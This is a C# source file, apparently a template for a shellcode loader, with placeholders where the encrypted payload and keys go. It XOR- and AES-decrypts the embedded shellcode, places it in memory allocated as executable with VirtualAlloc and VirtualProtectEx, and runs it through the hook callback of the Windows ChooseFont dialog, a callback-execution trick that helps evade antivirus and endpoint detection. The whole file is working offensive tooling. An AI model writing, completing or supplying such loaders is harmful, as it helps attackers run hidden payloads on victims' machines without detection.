using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace ReplaceText
{
    internal class Program
    {
        private static byte[] XorEncDec(byte[] input, byte[] theKey)
        {
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                int length = i % theKey.Length;
                mixed[i] = (byte)(input[i] ^ theKey[length]);
            }
            return mixed;
        }

        private static byte[] AESDecrypt(byte[] cipherData, byte[] aes_key, byte[] aes_iv)
        {
            MemoryStream ms = new MemoryStream();
            Rijndael alg = Rijndael.Create();
            alg.Key = aes_key;
            alg.IV = aes_iv;
            CryptoStream cs = new CryptoStream(ms, alg.CreateDecryptor(), CryptoStreamMode.Write);
            cs.Write(cipherData, 0, cipherData.Length);
            cs.Close();
            byte[] decryptedData = ms.ToArray();
            return decryptedData;
        }

        static void Main(string[] args)
        {
            byte[] encryptedShellcode = { ENCRYPTED_SHELL_CODE_BYTES };
            byte[] XorKey = { XOR_KEY_BYTES };
            byte[] AesKey = { AES_KEY_BYTES };
            byte[] AesIv = { AES_IV_BYTES };
            byte[] payload = new byte[] { };
            byte[] aesEncrypted = XorEncDec(encryptedShellcode, XorKey);
            payload = AESDecrypt(aesEncrypted, AesKey, AesIv);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            int CF_ENABLEHOOK = 0x8;

            CHOOSEFONT sCF = new CHOOSEFONT();
            sCF.lStructSize = Marshal.SizeOf(sCF);
            sCF.Flags = CF_ENABLEHOOK;
            sCF.lpfnHook = hAlloc;

            ChooseFont(ref sCF);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("comdlg32.dll")]
        public extern static bool ChooseFont(ref CHOOSEFONT lpcf);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct CHOOSEFONT
        {
            public int lStructSize;
            public IntPtr hwndOwner;
            public IntPtr hDC;
            public IntPtr lpLogFont;
            public int iPointSize;
            public int Flags;
            public int rgbColors;
            public IntPtr lCustData;
            public IntPtr lpfnHook;
            public string lpTemplateName;
            public IntPtr hInstance;
            public string lpszStyle;
            public short nFontType;
            private short __MISSING_ALIGNMENT__;
            public int nSizeMin;
            public int nSizeMax;
        }
    }
}
